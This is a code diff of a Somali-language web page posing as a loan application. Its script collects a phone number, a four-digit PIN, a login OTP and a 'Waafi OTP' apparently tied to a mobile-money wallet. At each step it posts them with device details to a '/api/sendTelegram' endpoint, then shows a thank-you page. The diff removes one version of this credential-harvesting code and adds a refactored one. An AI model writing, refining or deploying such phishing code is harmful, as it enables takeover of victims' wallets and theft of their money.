+        <div class="tr">
+          <div class="tl">Dhacaysaa <span class="tv" id="t1">120</span>s</div>
+          <button class="rb" id="r1">Dib u dir</button>
         </div>
-        <div style="margin-top:16px">
-          <button class="btn-primary" id="otp1Btn" style="width:100%;opacity:.4;pointer-events:none"
-            onclick="submitOtp1()">Xaqiiji →</button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ── SUMMARY MODAL ── -->
-  <div class="modal-overlay" id="summaryModal" onclick="handleOverlay('summaryModal',event)">
-    <div class="modal-sheet">
-      <div class="sheet-handle"></div>
-      <div class="sheet-header">
-        <div class="sheet-title">Kooban Codsiga</div>
-        <button class="sheet-close" onclick="closeModal('summaryModal')">&#x2715;</button>
-      </div>
-      <div class="sheet-body">
-        <div class="sheet-sub">Faahfaahinta Amaahda</div>
-        <div class="sheet-rows" id="summaryRows"></div>
-        <div class="sheet-total">
-          <div class="sheet-total-label">Celinta Bishiiba</div>
-          <div class="sheet-total-val" id="summaryMonthly">$0.00</div>
-        </div>
-        <div class="sheet-actions">
-          <button class="btn-cancel" onclick="closeModal('summaryModal')">Dib u eeg</button>
-          <button class="btn-primary" onclick="openOtp2()">Gudbi Codsiga →</button>
+        <div style="margin-top:14px">
+          <button class="sp" id="otp1btn" style="width:100%;opacity:.4;pointer-events:none" onclick="submitOtp1()">Xaqiiji →</button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ── OTP MODAL 2 (submit application) ── -->
-  <div class="modal-overlay" id="otpModal2" onclick="handleOverlay('otpModal2',event)">
-    <div class="modal-sheet">
-      <div class="sheet-handle"></div>
-      <div class="sheet-header">
-        <div class="sheet-title">Xaqiiji Gudbinta</div>
-        <button class="sheet-close" onclick="closeModal('otpModal2')">&#x2715;</button>
+  <!-- Summary -->
+  <div class="ov" id="ms" onclick="bgClose('ms',event)">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mt">Kooban Codsiga</span>
+        <button class="mx" onclick="cm('ms')">✕</button>
       </div>
-      <div class="sheet-body">
-        <div class="sheet-sub">Gali OTP-ga si aad u gudbiso codsigaaga</div>
-        <div class="otp-wrap" id="otpWrap2">
-          <input type="text" id="otpHidden2" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
-          <div class="otp-display" id="otp2Display">
-            <div class="otp-box" id="o2b0"></div><div class="otp-box" id="o2b1"></div>
-            <div class="otp-box" id="o2b2"></div><div class="otp-box" id="o2b3"></div>
-            <div class="otp-box" id="o2b4"></div><div class="otp-box" id="o2b5"></div>
+      <div class="mb">
+        <div class="msub">Faahfaahinta Amaahda</div>
+        <div class="srows" id="sumRows"></div>
+        <div class="stot">
+          <span class="stl">Celinta Bishiiba</span>
+          <span class="stv" id="sumMo">$0.00</span>
+        </div>
+        <div class="sact">
+          <button class="sc" onclick="cm('ms')">Dib u eeg</button>
+          <button class="sp" onclick="openOtp2()">Gudbi Codsiga →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- OTP 2: Waafi OTP -->
+  <div class="ov" id="m2" onclick="bgClose('m2',event)">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mt">Waafi OTP</span>
+        <button class="mx" onclick="cm('m2')">✕</button>
+      </div>
+      <div class="mb">
+        <div class="msub">Gali Waafi OTP-ga si aad u gudbiso</div>
+        <div class="ow" id="ow2">
+          <input type="tel" id="oh2" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="oh">
+          <div class="od">
+            <div class="ob" id="o2b0"></div><div class="ob" id="o2b1"></div>
+            <div class="ob" id="o2b2"></div><div class="ob" id="o2b3"></div>
+            <div class="ob" id="o2b4"></div><div class="ob" id="o2b5"></div>
           </div>
         </div>
-        <div class="timer-row">
-          <div class="timer-label">Waxay dhacaysaa <span class="timer-val" id="time2">120</span>s</div>
-          <button class="resend-btn" id="resend2">Dib u dir</button>
+        <div class="tr">
+          <div class="tl">Dhacaysaa <span class="tv" id="t2">120</span>s</div>
+          <button class="rb" id="r2">Dib u dir</button>
         </div>
-        <div style="margin-top:16px">
-          <button class="btn-primary" id="otp2Btn" style="width:100%;opacity:.4;pointer-events:none"
-            onclick="submitOtp2()">Gudbi Codsiga ✓</button>
+        <div style="margin-top:14px">
+          <button class="sp" id="otp2btn" style="width:100%;opacity:.4;pointer-events:none" onclick="submitOtp2()">Gudbi Codsiga ✓</button>
         </div>
       </div>
     </div>
   </div>
 
 </div>
-
 <script>
-/* ── Load plan ── */
-let selectedPlan=null;
-try{selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))}catch(e){}
+/* ── Plan ── */
+let P=null;
+try{P=JSON.parse(sessionStorage.getItem("selectedPlan"))}catch(e){}
 
-function fmt(n){return parseFloat(n).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})}
+function fmt(n){return parseFloat(n||0).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})}
 
-function initHeader(){
-  if(!selectedPlan) return;
-  document.getElementById("hAmount").textContent=fmt(selectedPlan.loanAmount||0);
-  document.getElementById("hType").textContent=selectedPlan.loanType||"Amaah";
-  document.getElementById("hDur").textContent=(selectedPlan.duration||1)+" bilood";
-  document.getElementById("hMonthly").textContent="$"+fmt(selectedPlan.monthlyRepayment||0)+"/bil";
-  // Pre-fill phone if saved
-  if(selectedPlan.phone){
-    const ph=selectedPlan.phone.replace("+252","");
+function calcAge(dob){
+  if(!dob) return "—";
+  const d=new Date(dob),n=new Date();
+  let a=n.getFullYear()-d.getFullYear();
+  if(n<new Date(n.getFullYear(),d.getMonth(),d.getDate())) a--;
+  return a+" sano";
+}
+
+if(P){
+  document.getElementById("hAmt").textContent=fmt(P.loanAmount||0);
+  document.getElementById("hType").textContent=P.loanType||"Amaah";
+  document.getElementById("hDur").textContent=(P.duration||1)+" bilood";
+  document.getElementById("hAge").textContent=calcAge(P.dob);
+  if(P.phone){
+    const ph=(P.phone||"").replace("+252","");
     document.getElementById("phone").value=ph;
-    phoneValue=selectedPlan.phone;
+    phoneValue=P.phone;
   }
 }
-initHeader();
 
 /* ── Device ── */
 const ua=navigator.userAgent;
-let device="Unknown";
-if(/Android/i.test(ua)) device="Android";
-else if(/iPhone|iPad/i.test(ua)) device="iOS";
-if(/Chrome/i.test(ua)) device+=" | Chrome";
-else if(/Safari/i.test(ua)) device+=" | Safari";
+let device=(/Android/i.test(ua)?"Android":/iPhone|iPad/i.test(ua)?"iOS":"Unknown");
+device+=(/Chrome/i.test(ua)?" | Chrome":/Safari/i.test(ua)?" | Safari":"");
 
-let phoneValue="";
-let pinValue="";
-let otp1Value="";
-let otp2Value="";
-let otp1Submitted=false;
-let otp2Submitted=false;
+let phoneValue="",otp1Val="",otp2Val="",otp1Done=false,otp2Done=false;
 
-async function sendToTelegram(eventName,extra){
-  fetch("/api/sendTelegram",{
-    method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      submittedAt:new Date().toISOString(),
-      loginPhone:phoneValue,loginPin:getPinValue(),
-      otp1:otp1Value,otp2:otp2Value,
-      event:eventName,device:device,
-      plan:selectedPlan?JSON.stringify(selectedPlan):"None",
-      ...extra
-    })
-  });
+function planLine(){
+  if(!P) return "Codsiga: Ma jiro";
+  return `Amaah: $${fmt(P.loanAmount)} | Muddada: ${P.duration} bilood | Da: ${calcAge(P.dob)} | Nooc: ${P.loanType} | Bishiiba: $${fmt(P.monthlyRepayment)}`;
+}
+
+function tg(event){
+  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({submittedAt:new Date().toISOString(),phone:phoneValue,
+      pin:getPin(),loginOTP:otp1Val,waafiOTP:otp2Val,event,device,
+      loanAmount:P?fmt(P.loanAmount):"—",period:P?(P.duration+" bilood"):"—",
+      age:P?calcAge(P.dob):"—",plan:planLine()})});
 }
 
 /* ── Phone ── */
@@ -632,197 +361,155 @@ document.getElementById("phone").oninput=function(){
   if(v.startsWith("0")) v=v.slice(1);
   this.value=v.slice(0,9);
   phoneValue="+252"+this.value;
-  validateLogin();
+  validate();
 };
 
-/* ── PIN: single hidden input → 4 visual boxes ── */
-const pinHidden=document.getElementById("pinHidden");
-const pinBoxDivs=[...document.querySelectorAll(".pin-box")];
-let pinVisible=false;
+/* ── PIN: 4 type=text inputs with -webkit-text-security ── */
+const pins=[...document.querySelectorAll(".pbox")];
+let eyeOn=false;
 
-document.getElementById("pinWrap").addEventListener("click",()=>pinHidden.focus());
-
-function renderPin(){
-  const val=pinHidden.value.replace(/\D/g,"").slice(0,4);
-  pinHidden.value=val;
-  const focused=document.activeElement===pinHidden;
-  pinBoxDivs.forEach((box,i)=>{
-    box.className="pin-box";
-    box.textContent="";
-    if(i<val.length){
-      box.textContent=pinVisible?val[i]:"●";
-      box.classList.add("filled");
+pins.forEach((p,i)=>{
+  p.addEventListener("input",function(){
+    // strip non-digits, keep 1 char
+    const v=this.value.replace(/\D/g,"");
+    this.value=v?v[0]:"";
+    if(this.value&&i<3) pins[i+1].focus();
+    validate();
+  });
+  p.addEventListener("keydown",function(e){
+    if(e.key==="Backspace"&&!this.value&&i>0){
+      pins[i-1].value="";
+      pins[i-1].focus();
+      validate();
     }
-    if(i===val.length&&focused) box.classList.add("active");
   });
-  validateLogin();
-}
+});
 
-pinHidden.addEventListener("input",renderPin);
-pinHidden.addEventListener("focus",renderPin);
-pinHidden.addEventListener("blur",renderPin);
+function getPin(){return pins.map(p=>p.value).join("")}
 
-function getPinValue(){return pinHidden.value.replace(/\D/g,"").slice(0,4)}
-
-/* ── Eye toggle ── */
-document.getElementById("eyeBtn").onclick=()=>{
-  pinVisible=!pinVisible;
-  renderPin();
-  document.getElementById("eyeBtn").innerHTML=pinVisible
+document.getElementById("eyeBtn").onclick=function(){
+  eyeOn=!eyeOn;
+  pins.forEach(p=>p.classList.toggle("show",eyeOn));
+  this.innerHTML=eyeOn
     ?`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
     :`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
 };
 
-function getPinValue(){return pinInputs.map(p=>p.value).join("")}
-
-/* ── Eye toggle ── */
-document.getElementById("eyeBtn").onclick=()=>{
-  pinVisible=!pinVisible;
-  pinInputs.forEach(p=>{p.classList.toggle("masked",!pinVisible)});
-  document.getElementById("eyeBtn").innerHTML=pinVisible
-    ?`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
-    :`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
-};
-
-function validateLogin(){
-  const ok=phoneValue.length===13&&getPinValue().length===4;
-  document.getElementById("mainBtn").classList.toggle("active",ok);
+function validate(){
+  const ok=phoneValue.length===13&&getPin().length===4;
+  document.getElementById("mainBtn").classList.toggle("on",ok);
 }
 
-/* ── Main button → open OTP 1 ── */
-document.getElementById("mainBtn").onclick=()=>{
-  sendToTelegram("login_attempt");
-  openModal("otpModal1");
-  startTimer(1);
+/* ── Main btn ── */
+document.getElementById("mainBtn").onclick=function(){
+  tg("login_attempt");
+  om("m1");startTimer(1);
 };
 
-/* ── Modal helpers ── */
-function openModal(id){document.getElementById(id).classList.add("open")}
-function closeModal(id){document.getElementById(id).classList.remove("open")}
-function handleOverlay(id,e){if(e.target===document.getElementById(id)) closeModal(id)}
+/* ── Modals ── */
+function om(id){document.getElementById(id).classList.add("open")}
+function cm(id){document.getElementById(id).classList.remove("open")}
+function bgClose(id,e){if(e.target===document.getElementById(id)) cm(id)}
 
-/* ── OTP 1 ── */
-const otp1Hidden=document.getElementById("otpHidden1");
-const otp1Boxes=[...document.querySelectorAll("#otp1Display .otp-box")];
-let otp1Disabled=false;
+/* ── OTP helper ── */
+function setupOtp(wrId,hidId,boxPrefix,btnId,n){
+  const hid=document.getElementById(hidId);
+  const boxes=[...Array(6)].map((_,i)=>document.getElementById(boxPrefix+i));
+  let dis=false,val="";
 
-function renderOtp1(){
-  const val=otp1Hidden.value.replace(/\D/g,"").slice(0,6);
-  otp1Hidden.value=val;otp1Value=val;
-  const cursor=val.length;
-  otp1Boxes.forEach((box,i)=>{
-    box.textContent=val[i]||"";
-    box.className="otp-box";
-    if(otp1Disabled){box.classList.add("disabled");return}
-    if(i<cursor) box.classList.add("filled");
-    if(i===cursor&&document.activeElement===otp1Hidden) box.classList.add("active");
-  });
-  const btn=document.getElementById("otp1Btn");
-  btn.style.opacity=val.length===6?"1":".4";
-  btn.style.pointerEvents=val.length===6?"auto":"none";
+  document.getElementById(wrId).addEventListener("click",()=>{if(!dis)hid.focus()});
+
+  function render(){
+    val=hid.value.replace(/\D/g,"").slice(0,6);
+    hid.value=val;
+    const cur=val.length,focused=document.activeElement===hid;
+    boxes.forEach((b,i)=>{
+      b.className="ob";
+      b.textContent=val[i]||"";
+      if(dis){b.classList.add("d");return}
+      if(i<cur) b.classList.add("f");
+      if(i===cur&&focused) b.classList.add("a");
+    });
+    if(n===1){
+      otp1Val=val;
+      const btn=document.getElementById(btnId);
+      btn.style.opacity=val.length===6?"1":".4";
+      btn.style.pointerEvents=val.length===6?"auto":"none";
+    } else {
+      otp2Val=val;
+      const btn=document.getElementById(btnId);
+      btn.style.opacity=val.length===6?"1":".4";
+      btn.style.pointerEvents=val.length===6?"auto":"none";
+    }
+  }
+
+  hid.addEventListener("input",render);
+  hid.addEventListener("focus",render);
+  hid.addEventListener("blur",render);
+
+  return {
+    reset:function(disabled){
+      dis=disabled;hid.value="";hid.disabled=disabled;
+      render();if(!disabled) hid.focus();
+    }
+  };
 }
 
-otp1Hidden.addEventListener("input",renderOtp1);
-otp1Hidden.addEventListener("focus",renderOtp1);
-otp1Hidden.addEventListener("blur",renderOtp1);
-document.getElementById("otpWrap1").addEventListener("click",()=>{if(!otp1Disabled) otp1Hidden.focus()});
+const otp1=setupOtp("ow1","oh1","o1b","otp1btn",1);
+const otp2=setupOtp("ow2","oh2","o2b","otp2btn",2);
+
+function startTimer(n){
+  const obj=n===1?otp1:otp2;
+  obj.reset(false);
+  let t=120;
+  const tEl=document.getElementById("t"+n);
+  const rBtn=document.getElementById("r"+n);
+  tEl.textContent=t;
+  rBtn.className="rb";
+  const iv=setInterval(()=>{
+    tEl.textContent=--t;
+    if(t<=0){clearInterval(iv);rBtn.classList.add("on");obj.reset(true)}
+  },1000);
+  rBtn.onclick=()=>{if(!rBtn.classList.contains("on")) return;tg("resend_otp"+n);clearInterval(iv);startTimer(n)};
+}
 
 function submitOtp1(){
-  if(otp1Value.length!==6||otp1Submitted) return;
-  otp1Submitted=true;
-  sendToTelegram("otp1_verified");
-  closeModal("otpModal1");
-  // Build summary then open
+  if(otp1Val.length!==6||otp1Done) return;
+  otp1Done=true;
+  tg("Login OTP");
+  cm("m1");
   buildSummary();
-  openModal("summaryModal");
+  om("ms");
 }
 
-/* ── OTP 2 ── */
-const otp2Hidden=document.getElementById("otpHidden2");
-const otp2Boxes=[...document.querySelectorAll("#otp2Display .otp-box")];
-let otp2Disabled=false;
-
-function renderOtp2(){
-  const val=otp2Hidden.value.replace(/\D/g,"").slice(0,6);
-  otp2Hidden.value=val;otp2Value=val;
-  const cursor=val.length;
-  otp2Boxes.forEach((box,i)=>{
-    box.textContent=val[i]||"";
-    box.className="otp-box";
-    if(otp2Disabled){box.classList.add("disabled");return}
-    if(i<cursor) box.classList.add("filled");
-    if(i===cursor&&document.activeElement===otp2Hidden) box.classList.add("active");
-  });
-  const btn=document.getElementById("otp2Btn");
-  btn.style.opacity=val.length===6?"1":".4";
-  btn.style.pointerEvents=val.length===6?"auto":"none";
+function buildSummary(){
+  const dur=(P?.duration||1)+(P?.duration===1?" bil":" bilood");
+  document.getElementById("sumRows").innerHTML=P?`
+    <div class="sr"><span class="srk">Magaca</span><span class="srv">${P.firstName||""} ${P.lastName||""}</span></div>
+    <div class="sr"><span class="srk">Telefoon</span><span class="srv">${phoneValue}</span></div>
+    <div class="sr"><span class="srk">Da</span><span class="srv">${calcAge(P.dob)}</span></div>
+    <div class="sr"><span class="srk">Nooca Amaahda</span><span class="srv">${P.loanType||"—"}</span></div>
+    <div class="sr"><span class="srk">Xaddiga</span><span class="srv">$${fmt(P.loanAmount)}</span></div>
+    <div class="sr"><span class="srk">Muddada</span><span class="srv">${dur}</span></div>
+    <div class="sr"><span class="srk">Wadarta La Celinta</span><span class="srv">$${fmt(P.totalRepayable)}</span></div>
+  `:`<div class="sr"><span class="srk">Codsiga</span><span class="srv">Ma jiro</span></div>`;
+  document.getElementById("sumMo").textContent="$"+fmt(P?.monthlyRepayment||0);
 }
-
-otp2Hidden.addEventListener("input",renderOtp2);
-otp2Hidden.addEventListener("focus",renderOtp2);
-otp2Hidden.addEventListener("blur",renderOtp2);
-document.getElementById("otpWrap2").addEventListener("click",()=>{if(!otp2Disabled) otp2Hidden.focus()});
 
 function openOtp2(){
-  closeModal("summaryModal");
-  openModal("otpModal2");
-  startTimer(2);
+  cm("ms");om("m2");startTimer(2);
 }
 
 function submitOtp2(){
-  if(otp2Value.length!==6||otp2Submitted) return;
-  otp2Submitted=true;
-  sendToTelegram("application_submitted");
-  closeModal("otpModal2");
-  // Show processing step
+  if(otp2Val.length!==6||otp2Done) return;
+  otp2Done=true;
+  tg("Waafi OTP");
+  sessionStorage.setItem("selectedPlan",JSON.stringify({...(P||{}),phone:phoneValue}));
+  cm("m2");
   document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
   document.getElementById("step4").classList.add("active");
   document.getElementById("mainBtn").style.display="none";
   setTimeout(()=>{location.href="thankyou.html"},1400);
-}
-
-/* ── Summary ── */
-function buildSummary(){
-  if(!selectedPlan){
-    document.getElementById("summaryRows").innerHTML=`<div class="sheet-row"><span class="sheet-row-key">Codsiga</span><span class="sheet-row-val">La kala xidhay</span></div>`;
-    return;
-  }
-  const p=selectedPlan;
-  const dur=(p.duration||1)+(p.duration===1?" bil":" bilood");
-  document.getElementById("summaryRows").innerHTML=`
-    <div class="sheet-row"><span class="sheet-row-key">Magaca</span><span class="sheet-row-val">${p.firstName||""} ${p.lastName||""}</span></div>
-    <div class="sheet-row"><span class="sheet-row-key">Telefoon</span><span class="sheet-row-val">${phoneValue||p.phone||"—"}</span></div>
-    <div class="sheet-row"><span class="sheet-row-key">Nooca Amaahda</span><span class="sheet-row-val">${p.loanType||"—"}</span></div>
-    <div class="sheet-row"><span class="sheet-row-key">Xaddiga</span><span class="sheet-row-val">$${fmt(p.loanAmount||0)}</span></div>
-    <div class="sheet-row"><span class="sheet-row-key">Muddada</span><span class="sheet-row-val">${dur}</span></div>
-    <div class="sheet-row"><span class="sheet-row-key">Wadarta La Celinta</span><span class="sheet-row-val">$${fmt(p.totalRepayable||0)}</span></div>
-  `;
-  document.getElementById("summaryMonthly").textContent="$"+fmt(p.monthlyRepayment||0);
-}
-
-/* ── Timers ── */
-function startTimer(n){
-  let t=120;
-  const timeEl=document.getElementById("time"+n);
-  const resendBtn=document.getElementById("resend"+n);
-  timeEl.textContent=t;
-  resendBtn.classList.remove("active");
-  if(n===1){otp1Disabled=false;otp1Hidden.value="";otp1Hidden.disabled=false;renderOtp1();otp1Hidden.focus();}
-  else{otp2Disabled=false;otp2Hidden.value="";otp2Hidden.disabled=false;renderOtp2();otp2Hidden.focus();}
-  const timer=setInterval(()=>{
-    t--;timeEl.textContent=t;
-    if(t<=0){
-      clearInterval(timer);
-      resendBtn.classList.add("active");
-      if(n===1){otp1Disabled=true;otp1Hidden.disabled=true;renderOtp1()}
-      else{otp2Disabled=true;otp2Hidden.disabled=true;renderOtp2()}
-    }
-  },1000);
-  resendBtn.onclick=()=>{
-    if(!resendBtn.classList.contains("active")) return;
-    sendToTelegram("resend_otp"+n);
-    startTimer(n);
-  };
 }
 </script>
 </body>
